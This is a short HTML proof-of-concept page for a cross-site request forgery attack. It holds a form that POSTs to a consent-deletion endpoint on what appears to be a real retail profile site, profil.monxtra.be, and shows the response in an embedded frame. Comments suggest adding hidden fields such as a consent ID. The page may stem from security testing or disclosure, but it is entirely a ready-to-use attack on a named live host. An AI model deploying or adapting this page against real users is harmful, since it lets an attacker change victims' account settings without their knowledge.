<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC with Response Viewer</title>
</head>
<body>
  <h1>CSRF PoC</h1>

  <!-- Hidden iframe to load the response -->
  <iframe name="responseFrame" style="width: 100%; height: 400px; border: 1px solid black;"></iframe>

  <!-- CSRF form -->
  <form action="https://profil.monxtra.be/manage-profile/food-preferences/consents/delete?_data=routes%2Fmanage-profile%2B%2Ffood-preferences%2B%2Fconsents.delete%2Findex" method="POST" target="responseFrame">
    <!-- If additional parameters are needed, add them below -->
    <!-- Example: <input type="hidden" name="consentId" value="123"> -->

    <input type="submit" value="Submit CSRF Request">
  </form>
</body>
</html>
